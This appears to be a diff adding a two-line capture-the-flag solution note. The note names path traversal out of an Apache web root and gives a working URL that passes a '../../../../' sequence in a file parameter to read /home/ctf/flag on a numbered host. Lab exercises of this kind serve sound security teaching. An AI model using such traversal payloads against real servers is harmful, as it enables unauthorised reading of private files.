@@ -1,0 +1,2 @@
+path traversal, get out of /var/www/html/apache
+http://141.85.224.102/index.php?file=../../../../home/ctf/flag
